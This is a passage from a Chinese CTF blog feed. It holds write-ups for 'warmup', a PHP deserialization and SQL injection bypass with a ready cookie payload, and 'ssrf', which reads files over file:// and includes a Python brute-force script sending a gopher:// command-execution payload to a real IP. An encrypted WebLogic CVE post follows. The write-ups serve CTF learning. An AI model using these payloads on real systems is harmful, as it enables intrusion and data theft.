alt="mark"></p><p>获取到flag：</p><p>flag{de3110dce011088cd4add1950a49182f}</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>打开后是index.php是一个登录页面</p><p><img src="http://pic.c1imber.top/blog/20201207/rn7W3RlFz1h3.png?imageslim" alt="mark"></p><p>根据题目提示下载源码进行简单的审计</p><p>index.php 131-132行</p><p>通过addslashes函数对传入的<code>$_POST[&#39;username&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>进行了处理，防止了sql注入</p><p><img src="http://pic.c1imber.top/blog/20201207/6fSWU2JqwsiC.png?imageslim" alt="mark"></p><p>但是看conn.php当中有可能存在反序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </div><div class="line"></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $table = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $conn;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"xxxxx"</span>, <span class="string">"xxxx"</span>, <span class="string">"xxxx"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</div><div class="line">        $result = <span class="keyword">$this</span>-&gt;query();</div><div class="line">        <span class="keyword">if</span> ($result === <span class="keyword">false</span>) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"database error, please check your input"</span>);</div><div class="line">        &#125;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span>($row === <span class="keyword">NULL</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"username or password incorrect!"</span>);</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</div><div class="line">            $flag = file_get_contents(<span class="string">'flag.php'</span>);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome, admin! this is your flag -&gt; "</span>.$flag;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome! but you are not admin"</span>;</div><div class="line">        &#125;</div><div class="line">        $result-&gt;free();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query (<span class="string">"select username,password from "</span>.<span class="keyword">$this</span>-&gt;table.<span class="string">" where username='"</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"' and password='"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"'"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span>&#123;</div><div class="line">        $blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;table, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;username, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;password, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;conn)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;connect ();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;check_login();</div><div class="line">        <span class="keyword">$this</span>-&gt;conn-&gt;close();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>而在index.php第115行：<code>$last_login_info = unserialize (base64_decode ($_COOKIE[&#39;last_login_info&#39;]));</code>这段代码刚好可以触发<code>SQL类</code>的<code>__wakeup</code>函数，造成反序列化漏洞，导致<code>SQL类</code>当中的属性可控</p><p>SQL类当中的waf过滤了很多字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div></pre></td></tr></table></figure><p>但是没有过滤单引号，于是构造出poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"> <span class="keyword">public</span> $table=<span class="string">"users"</span>;</div><div class="line"> <span class="keyword">public</span> $username=<span class="string">"' or '1"</span>;</div><div class="line"> <span class="keyword">public</span> $password=<span class="string">"' or '1"</span>;  </div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> SQL()));</div></pre></td></tr></table></figure><p>获得：</p><pre><code>TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>访问index.php，传入</p><pre><code>Cookie: last_login_info=TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>获取到flag</p><p>flag{5dd2d5f45fw6e6f11ewf1f224f5121e2}</p><p><img src="http://pic.c1imber.top/blog/20201207/8kpluRrm76mM.png?imageslim" alt="mark"></p><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>比赛时没做出来，说一下当时的思路</p><p>首先file协议读了源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</div><div class="line">init(); </div><div class="line"></div><div class="line">$is_die = <span class="number">0</span>;</div><div class="line">$is_post = <span class="number">0</span>;</div><div class="line">$die_mess = <span class="string">''</span>;</div><div class="line">$url = <span class="string">''</span>;  </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'captcha'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'captcha'</span>]))</div><div class="line">&#123;</div><div class="line">    $url = $_POST[<span class="string">'url'</span>];</div><div class="line">    $captcha = $_POST[<span class="string">'captcha'</span>];</div><div class="line">    $is_post = <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( $captcha !== $_SESSION[<span class="string">'answer'</span>])</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"wrong captcha"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/flag|proc|log/i'</span>, $url) )</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"hacker"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>可以看到过滤了flag，其实这里直接url编码一次就可以绕过了，当时没想到这点，感觉这样解应该算是非预期了</p><p>lib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">    $output = curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">    <span class="keyword">return</span> $output;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $answer = rand(<span class="number">1</span>,<span class="number">100000</span>);</div><div class="line">    $_SESSION[<span class="string">'captcha'</span>] = substr(md5($answer),<span class="number">-6</span>,<span class="number">6</span>);</div><div class="line">    $_SESSION[<span class="string">'answer'</span>] = strval($answer);</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $_SESSION = [];</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'captcha'</span>]) || !<span class="keyword">isset</span>($_SESSION[<span class="string">'answer'</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]))</div><div class="line">    &#123;</div><div class="line">        destroy_session();</div><div class="line">        set_session();</div><div class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]) ? <span class="keyword">die</span>(<span class="string">"&lt;script&gt;location.href='./index.php'&lt;/script&gt;"</span>) : <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>正常的请求读取代码，存在ssrf</p><p>端口扫描脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">8080</span>,<span class="number">65535</span>):</div><div class="line">    session = requests.Session()</div><div class="line">    url=<span class="string">"http://124.71.187.100:8079/index.php"</span></div><div class="line">    headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://124.71.187.100:8079"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://124.71.187.100:8079/index.php"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">    res=session.get(url,headers=headers).text</div><div class="line">    code=res.split(<span class="string">'== "'</span>)[<span class="number">1</span>].split(<span class="string">'"'</span>)[<span class="number">0</span>]</div><div class="line">    <span class="comment">#print code</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100000</span>):</div><div class="line">        <span class="keyword">if</span> hashlib.md5(str(i)).hexdigest()[<span class="number">-6</span>:]==code:</div><div class="line">            <span class="comment">#print i</span></div><div class="line">            <span class="comment">#paramsPost = &#123;"captcha":"&#123;&#125;".format(i),"url":"file:///var/www/htmlssrf123123/index.php"&#125;</span></div><div class="line">            paramsPost = &#123;<span class="string">"captcha"</span>:<span class="string">"&#123;&#125;"</span>.format(i),<span class="string">"url"</span>:<span class="string">"gopher://127.0.0.1:47852/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A47852%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Acmd%253Dcat%2520%252Ffla%252A%250A"</span>&#125;</div><div class="line">            response = session.post(<span class="string">"http://124.71.187.100:8079/index.php"</span>, data=paramsPost)</div><div class="line">            <span class="keyword">print</span> response.text</div><div class="line">            <span class="keyword">if</span> len(response.text)!=<span class="number">1046</span>:</div><div class="line">                <span class="keyword">if</span> <span class="string">"wrong captcha"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</div><div class="line">                    <span class="comment">#print str(port)+"\n"</span></div><div class="line">                    <span class="comment">#print response.text</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure><p>跑了一遍，很慢，啥也扫不到</p><p>换个思路，因为目前可以读文件，所以先信息搜集一下，读取apache配置文件：<code>file:///etc/apache2/sites-enabled/000-default.conf</code></p><pre><code>&lt;VirtualHost *:80&gt;        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;  &lt;VirtualHost *:47852&gt;        ServerAdmin secret@localhost        DocumentRoot /var/www/htmlssrf123123        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;</code></pre><p>读取源码:<code>file:///var/www/htmlssrf123123/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">        <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</div><div class="line">        exec($_POST[<span class="string">'cmd'</span>]);</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span>    &lt;/div&gt;</div></pre></td></tr></table></figure><p>由于exec函数没有回显，所以只能通过反弹shell（不出网）、写入文件（/tmp目录都写不进去）、延时盲注（sleep 5存在延时）进行回显，但是前两种方法均一直不能成功,看了好几篇wp也都是二次url编码的非预期解，不知道是不是题目有问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h1&gt;&lt;p&gt;补一下，11月份的比赛，太忙一直没时间更新&lt;/p&gt;
&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>weblogic cve-2020-14882 漏洞复现以及回显方式研究</title>
    <link href="https://c1aysec.github.io/2020/11/02/weblogic%20cve-2020-14882%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BB%A5%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/"/>
    <id>https://c1aysec.github.io/2020/11/02/weblogic cve-2020-14882 漏洞复现以及回显方式研究/</id>
    <published>2020-11-01T16:13:48.426Z</published>
    <updated>2020-11-02T02:48:36.688Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b0f4e5e4d6be01772b81bbf7af3339aec014ad81516886718ed62320eae1fa92">671467ac107a47ffc4735fbe04fddfe573f05c352b13d4e022f9a9e30e133dc1b073c13b7cf37e410f368ccbb65e42ab0cf50e2569965423454070c99f8512eeffedbcf286bd246daf742da650889b40807977635c78b72afe27bd0d819f96219792ef31eba31d2fb02422fbdbc10c9dea20e00c7c6bb6cc83209a1be82d0351926f1bb50b91ca2b6daa6ccd7863b29c8661cef16c0516cad0755b93284952841d4bcda6f94f3f720df162166ce198c84eb8b3f23e03f116c71dd642181c948faad6817f84dbb482d609f51ef5a4180f768351ca7c2a627b5c8abc09d54644ca05f3fdd793a50ae6dcf228a5b30ab157410c67fbdad1cc12f91c6ea1c6823a1a399eaabd11293c2020741abad89dfd7745ab8ebd6d6d68d4a51ab076e7cc9bbf3d6e87b0c878ef8c3170047ab93b54c5018e799dd3d0a904da34a39509d021540fa44b47c6005f2b84956fbbc745ad8a9eb23337d84dae14cfd25911b9c921811fa18c97714635d58b60e1f30931ccff5b6d4dc2c2e8b17b26736f260ac505fd93bcab5f72b99b7bd93c7ae524d8c4b26191c02ad0bdaa5fe8e5a0323937faf3a3cc6bae248d870d11288e2ebc3cbb15c06a0763636a3add6944fcfa5eff4baccd702fa4811e8936bb3c4bb5f5b50e7e3df4fdac6ae829ed49365d2e254bc995df634e58800aa33c31be59fdff482837076dc488f6ea9e77f3c41bf4921ff82394f4bf4c90e5be11f571d009b4b34dfd4d0127787ae648afd20acac89fa03756d2048cc90b51a2df978fed69185dc16031a02fb59552531c943bdb87c2f552743f6a2015130689c27194b6d39af26a819466358cc3587a5fea4fd1686f11a0015244c657554099aa78f3c9537545a78865941cf3deeec49fa0c7bf50a25cde704a516f4d631b873e0c50e972517c794c23eea9bc7bafe8d0ae20328c7489fcdbdcc89f25d5d84fb166f880af5b9e7ded65f347a0d150f584ff465173d0e3e4ed10a30aff6405f1e790b7b8354d5fd45f8d90dbfcb20e03701be955d44d55631959603b3b7ce7253ddb6f9345f0d6ae59284bb2db982d32d6a8a65d9ff328034b7bf61e7c1923506d162461d157b9fa2a21ca2034b9cd286baee41521d5aa85657efa09ee2835e2f8df4b9e098f3e49ae6598ce9f15374ee6d9ab169fd39421e06dc2abd6a98183b0cf9b0e4de1431a468cbb741090ce4dcaba9f12ad063058a95a0859423ef07dff84de8f2bb5e1bf0b9783b74fad303b383c35bfc7b866cd72d9e4161c2d0cc7132c30184bee30cbe0e8965f374d09a1aca4beafb6a7928d3568aaadc17a332b94f922fb86d134d6f646aa6e365eeb89adbf0488cc42d3f159464f3cf19541991d86668d5d7b3ca6182ab5d49d936558c91c691854dc3a4fd6f2f61c31ffe8004eb6d82812f2862627b74a37cac165312d2ec3502b9ebf1aacfe4c2c15ceeec15f8b7be359bdaefc2948138007ed07273bfcb3c49fcb5b5aa11ca4f841c3b262bc76e40dbaa44d520b8de5d80544b718a5e26049d9380d8b3f65784cc665e9fc261288a6c7489527d5ff86a78054ad2dd437460db70efc724626e7d2aba60f3b3be5f9d295af6109d470171f705739471cba9e64eadb95e3d3ece6e685ea4f602b5e4513aa015c11ba07f50066f6faf5fe9c26fa754fc8f0394f52db6e53a196248465c76adb71e8c2a1478e81934f1462b982afcafd4547d8bc3380875b5ae18ec04448219862a43e4b464839754655e434d06fda203619cc10f28720d6e34949e9edb1af7d5ccb96e3aecf8ba6b6825ef535c99c0e330ceff13c488baa449357e8f49eddff36af5a2af1f91f257172a14ba426558ad732aaf6738345f85eba333e15dac43f7c1436e48c306dc880b4aee2cc1aacd8c67b8d828f77fac505f61709a093b2594d23bcddbcbc1fdddfa004fb13111f83870fe3fe138ee86bed775d81a0ad2b750cb07f79a54e3699f30f3b1eb62fe182ed55bbdfa83265d06fdfadae47e48b0ae02c236d81ff3e760fe58ee085e689bffd0ca3599d3074ebc262529795ab6ce38dbaa0b2691ae7faef6301004e80e1b4d82c2810f3b17be71ecb4e2ecad68cc7caf68cf63e512f33835f42d4461f15190b1f52405df47dba054089440e966a8921d3e8a79d2c41544bd6dd61847869dcee48d2520547dc2ad4b2699cc1556bd4716fbb4d35dfc94bdf35d32a3e68f186aaa28efff336ec96e21c5e6b5ac06bbd0edd227d2fa41c089847830a99aec594e79c8889ba257bff6345104cff364e1eab57b831ee55f6f8ebb1e794fdb9d44109a1533a3b8ac54a25849f4225c9da1f6ef09955d5694abe5aa26b8daf97f51e8ab66033ca13314c05fcb9b4e20edceeb8e29a19f0ddbf111690971491697e37638f9c1a92703c33fb7b58a5019cc8a78b4a3112b42c001d28048b823731bdf20f3c7bb19d147fa0e6fe42d0d90aa83098cd25daa3a1e9d07019cddf3c5dff0a554a819871b585e5a7a4f30c922f9925bc97678ca37e63aa385cc01f5b17faa1fc60b205f477e5ffb8c7852fb0f9b0d37048d3ffbeb430673b69699ab1ea190d691542f5cc0656cb506165ff47385ca625430e5404b2515989ccf2fe750ced475868e5247b724aa3ba102669ac3e06b6c59bfe369e556f470399e418fac63ae8397246089311f5b56c103ad1b28024841bd50be21802e806f4ec8f3a11cd0b72929789d3bb7a887b9a50a33689f473bccaa8850931ed8e781be7a61643be4fc0a3153d703036fa23378106255c8a8af288f163b53c64f223a67006302ded53354d9e797252d008c393fa0c1ee25f595a97a60d7e1223f2dae2b9e9e6a587b898d779e86465e99ea87e840722fb235983d3c965fbe3f4e2341f5232e33af40c00ee22e8205430b58963a63fa38517e1bfef7ea0e832e6f02ef13c0ec07ea4ede88e3b9980d9619bdbe1d83333621dff194979fe529ad4cc569362beae998e1f3c7764ec2232da77a0bcb7717018318c628d31a6f798d38e29757493f155197ed5754b8971dcad3098953271add3322ac65bdbc43471acc95c37f694b9c46b2cccc62b91e78504a135ca6de595786ce35e88d7eee6a9b05577e1c016bb851eb6a89a4e72ffd6efd6abe5c29b95d601e593ba29ecf23ca34f312f4e5c67171f9d27478e739997d7248dd05227f6660a211c80ae619fcd6739742e5186a2aebb9672be9ce0a5d0c6c58017460aca78c2dfc7f081b297b3fbb437544d3a2bbc8d0a004fa0a41d08d5757b9fea4e6314153c8bda35531f107dbe675b33b21fc4b3388bec7a82a0001c4117411b20041c8628531cbc6a546109f4d2eb73f87f45163064ce6a17f5c5d8142d123a771608fe48650f8cfe53ce5ff4f1f35e1ebc1d0c00887e66bdf20e697c0093338edce7426cb80a00670dc18e0ab0203b47c3361a189cb8e5adf0ec0d1f2af73d57b647e1fb7ddcde5778dbb130c361c5a43342dc5bd93070e13ce67fd99bcf27296984df28c882cf0ec8fe975de026f9265d7f502eea1641c87f5b338417909c777fd8e719e24d15f66d5910dde267a3cc6b4dae3b454c5427a88c5889b1b027a1622fe2236666aafef13570081ca13e044484eb8a11ba1d73aa984f50c9f775ecfc08a0ec5dda057e2e96cbe9c49fb8f6494931dd3c9a988bf6aaac4c9fa14142ec9bab863291e9ece2497256d5b5e9a151c9065a23b993ce550829a0d6f4db11c29268095558a7840535be2aa15ce3d49311c560f6695d658e3611f19de6874644c0c9860a237b1c38a961c76d94974e6aaa89a179e6382b1a5f496142244abecfc10667f12d062e16f990f637c6a8d137fdd37eacf3883dd3f2e30c20eefba9f123c51c763ebd885d13aa3333bb0464b3c3bd8ea2f29dad1434297d3abeb8c7cdb2f547d6b3f13709e48b63375c292f1b835b70cde1399e